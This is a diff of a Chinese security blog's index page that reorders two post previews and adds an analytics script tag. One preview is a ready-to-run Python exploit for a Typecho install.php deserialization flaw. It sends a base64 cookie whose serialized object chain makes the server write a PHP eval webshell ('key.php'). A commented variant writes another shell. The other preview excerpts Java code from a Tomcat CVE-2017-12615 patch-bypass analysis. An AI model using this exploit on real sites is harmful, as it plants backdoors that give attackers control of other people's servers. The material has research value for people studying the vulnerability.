@@ -679,7 +679,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://rainbow541.github.io/2017/12/09/Tomcat/">
+    <link itemprop="mainEntityOfPage" href="https://rainbow541.github.io/2017/12/09/Typecho/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="rainbow541">
@@ -698,7 +698,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/12/09/Tomcat/" itemprop="url">Tomcat CVE-2017-12615 补丁bypass</a></h1>
+                <a class="post-title-link" href="/2017/12/09/Typecho/" itemprop="url">Typecho Install.php 任意代码执行</a></h1>
         
 
         <div class="post-meta">
@@ -742,7 +742,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,128
+                  967
                 </span>
               
 
@@ -768,11 +768,11 @@
 
       
         
-          <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="补丁原理"><a href="#补丁原理" class="headerlink" title="补丁原理"></a>补丁原理</h3><p>当补丁打完之后，我们传入文件的时候，程序做了这样的处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected File file(String name, boolean mustExist) &#123;</span><br><span class="line">    File file = new File(base, name);</span><br><span class="line">    return validate(file, mustExist, absoluteBase);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>调用了<code>validate</code>函数</p>
+          <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(request_url):</span><br><span class="line">    url = request_url+&quot;/install.php?finish=1&quot;</span><br><span class="line">    headers = &#123;&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line">            &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;,</span><br><span class="line">            &apos;Accept-Language&apos;: &apos;en-us;q=0.5,en;q=0.3&apos;,</span><br><span class="line">            &apos;Cache-Control&apos;: &apos;max-age=0&apos;,</span><br><span class="line">            &apos;Referer&apos;:request_url+&apos;/install.php&apos;,</span><br><span class="line">            &apos;Connection&apos;: &apos;close&apos;,</span><br><span class="line">            &apos;Cookie&apos;: &apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjA6ImZpbGVfcHV0X2NvbnRlbnRzKCdrZXkucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtwYXNzXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&apos;,</span><br><span class="line">            #&apos;Cookie&apos;: &apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo0OiJldmFsIjt9fX19fXM6NjoicHJlZml4IjtzOjc6InR5cGVjaG8iO30=&apos;,</span><br><span class="line">            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0&apos;&#125;</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line">    z = s.get(url=url)</span><br><span class="line">    print z.content</span><br><span class="line"></span><br><span class="line">parser = optparse.OptionParser(&quot;usage%prog&quot; + &quot;-u &lt;target url&gt;&quot;)</span><br><span class="line">parser.add_option(&apos;-u&apos;, dest = &apos;tgturl&apos;, type = &apos;string&apos;, help = &quot;please scand url.&quot;)</span><br><span class="line">(options,args) = parser.parse_args()</span><br><span class="line">tgturl = options.tgturl</span><br><span class="line">exp(tgturl)</span><br></pre></td></tr></table></figure>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这是一个PHP序列化的漏洞</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017/12/09/Tomcat/#more" rel="contents">
+            <a class="btn" href="/2017/12/09/Typecho/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -966,7 +966,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://rainbow541.github.io/2017/12/09/Typecho/">
+    <link itemprop="mainEntityOfPage" href="https://rainbow541.github.io/2017/12/09/Tomcat/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="rainbow541">
@@ -985,7 +985,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/12/09/Typecho/" itemprop="url">Typecho Install.php 任意代码执行</a></h1>
+                <a class="post-title-link" href="/2017/12/09/Tomcat/" itemprop="url">Tomcat CVE-2017-12615 补丁bypass</a></h1>
         
 
         <div class="post-meta">
@@ -1029,7 +1029,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  967
+                  1,128
                 </span>
               
 
@@ -1055,11 +1055,11 @@
 
       
         
-          <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(request_url):</span><br><span class="line">    url = request_url+&quot;/install.php?finish=1&quot;</span><br><span class="line">    headers = &#123;&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line">            &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;,</span><br><span class="line">            &apos;Accept-Language&apos;: &apos;en-us;q=0.5,en;q=0.3&apos;,</span><br><span class="line">            &apos;Cache-Control&apos;: &apos;max-age=0&apos;,</span><br><span class="line">            &apos;Referer&apos;:request_url+&apos;/install.php&apos;,</span><br><span class="line">            &apos;Connection&apos;: &apos;close&apos;,</span><br><span class="line">            &apos;Cookie&apos;: &apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjA6ImZpbGVfcHV0X2NvbnRlbnRzKCdrZXkucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtwYXNzXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&apos;,</span><br><span class="line">            #&apos;Cookie&apos;: &apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo0OiJldmFsIjt9fX19fXM6NjoicHJlZml4IjtzOjc6InR5cGVjaG8iO30=&apos;,</span><br><span class="line">            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0&apos;&#125;</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line">    z = s.get(url=url)</span><br><span class="line">    print z.content</span><br><span class="line"></span><br><span class="line">parser = optparse.OptionParser(&quot;usage%prog&quot; + &quot;-u &lt;target url&gt;&quot;)</span><br><span class="line">parser.add_option(&apos;-u&apos;, dest = &apos;tgturl&apos;, type = &apos;string&apos;, help = &quot;please scand url.&quot;)</span><br><span class="line">(options,args) = parser.parse_args()</span><br><span class="line">tgturl = options.tgturl</span><br><span class="line">exp(tgturl)</span><br></pre></td></tr></table></figure>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这是一个PHP序列化的漏洞</p>
+          <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="补丁原理"><a href="#补丁原理" class="headerlink" title="补丁原理"></a>补丁原理</h3><p>当补丁打完之后，我们传入文件的时候，程序做了这样的处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected File file(String name, boolean mustExist) &#123;</span><br><span class="line">    File file = new File(base, name);</span><br><span class="line">    return validate(file, mustExist, absoluteBase);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>调用了<code>validate</code>函数</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017/12/09/Typecho/#more" rel="contents">
+            <a class="btn" href="/2017/12/09/Tomcat/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1726,6 +1726,7 @@
   
 
   
+  <script type="text/javascript" src="http://tajs.qq.com/stats?sId=65845847" charset="UTF-8"></script>
 </body>
 </html>
 <script type="text/javascript" src="/js/src/love.js"></script>
